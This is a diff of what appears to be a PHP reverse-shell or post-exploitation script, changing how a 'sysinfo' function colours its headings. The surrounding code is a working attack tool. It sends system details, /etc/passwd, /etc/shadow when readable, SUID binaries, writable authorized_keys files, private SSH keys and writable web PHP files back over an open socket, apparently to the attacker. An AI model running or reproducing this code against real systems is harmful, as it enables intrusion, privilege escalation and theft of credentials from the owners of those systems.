@@ -175,7 +175,7 @@ $ps1 = str_replace(PHP_EOL,"",green(run_cmd("whoami")."@".run_cmd("hostname"))."
 
 function sysinfo(){
 	global $s;
-	fwrite($s,"\n\e[92m====================== Initial info ======================\e[39m\n\n");
+	fwrite($s,green("\n====================== Initial info ======================\n\n"));
 	$info  = cyan("[i] OS info:\n").run_cmd("lsb_release -a | grep -v 'No LSB'").PHP_EOL;
 
 	$info .= cyan("[i] Hostname: ").run_cmd("hostname");
@@ -186,19 +186,19 @@ function sysinfo(){
 	$info .= cyan("[i] User/groups: ").run_cmd("id").PHP_EOL;
 	fwrite($s, $info);
 
-	fwrite($s,"\e[92m====================== Users info ======================\e[39m\n\n");
+	fwrite($s,green("====================== Users info ======================\n\n"));
 	$info  = cyan("[i] Current user: ").run_cmd("whoami");
 	$info .= cyan("[i] Users in /home: \n").run_cmd("ls /home").PHP_EOL;
 	$info .= cyan("[i] Crontab of current user: \n").run_cmd("crontab -l | egrep -v '^#'").PHP_EOL;
 	$info .= cyan("[i] Crontab: \n").run_cmd("cat /etc/crontab | egrep -v '^#'").PHP_EOL;
 	fwrite($s, $info);
 
-	fwrite($s,"\e[92m====================== All users ======================\e[39m\n\n");
+	fwrite($s,green("====================== All users ======================\n\n"));
 	fwrite($s, run_cmd("cat /etc/passwd").PHP_EOL);
 	if(is_readable("/etc/shadow"))
 		fwrite($s, red("[!] /etc/shadow is readable!\n").run_cmd("cat /etc/shadow").PHP_EOL);
 
-	fwrite($s, "\e[92m====================== Net info ======================\e[39m\n\n");
+	fwrite($s, green("====================== Net info ======================\n\n"));
 	$info  = cyan("[i] IP Info: ").run_cmd("ifconfig").PHP_EOL;
 	$info .= cyan("[i] Hosts: \n").run_cmd("cat /etc/hosts | grep -v '^#'").PHP_EOL; // /etc/hosts file
 	$info .= cyan("[i] Interfaces/routes: \n").run_cmd("cat /etc/networks && route").PHP_EOL;
@@ -206,7 +206,7 @@ function sysinfo(){
 	$info .= cyan("[i] Active ports: ").run_cmd("(netstat -punta) 2>/dev/null").PHP_EOL; //established, listening, 0.0.0.0, 127.0.0.1
 	fwrite($s, $info);
 
-	fwrite($s, "\e[92m====================== Interesting binaries ======================\e[39m\n\n");
+	fwrite($s, green("====================== Interesting binaries ======================\n\n"));
 	$interesting_binaries = ['nc','nc.traditional','ncat','nmap','perl','python','python2','python2.6','python2.7','python3','python3.6','python3.7','ruby','node','gcc','g++','docker','php'];
 	foreach ($interesting_binaries as $binary) {
 		$binary = shell_exec("which $binary 2>/dev/null");
@@ -214,13 +214,13 @@ function sysinfo(){
 			fwrite($s, run_cmd("ls -l $binary"));
 	}
 
-	fwrite($s, "\n\e[92m====================== SUID binaries ======================\e[39m\n\n");
+	fwrite($s, green("\n====================== SUID binaries ======================\n\n"));
 	$suid_list = explode("\n",shell_exec("find / -type f -perm /4000 2>/dev/null"));
 	foreach($suid_list as $suid)
 		if($suid !== "")
 			fwrite($s, run_cmd("ls -l $suid"));
 
-	fwrite($s, "\n\e[92m====================== SSH files ======================\e[39m\n\n");
+	fwrite($s, green("\n====================== SSH files ======================\n\n"));
 	$authorized_keys = explode("\n",shell_exec("find / -type f -name authorized_keys 2>/dev/null")); // search for authorized_keys file
 	foreach($authorized_keys as $public_key)
 		if(is_writable($public_key))
@@ -234,7 +234,7 @@ function sysinfo(){
 		else
 			fwrite($s, $priv_key.PHP_EOL);
 
-	fwrite($s, "\n\e[92m=================== Writable PHP files ===================\e[39m\n\n");
+	fwrite($s, green("\n=================== Writable PHP files ===================\n\n"));
 	$webfiles_arr = [];
 	$webdir = ['/var/www','/srv','/usr/local/apache2','/var/apache2','/var/www/nginx-default'];
 	foreach($webdir as $dir)
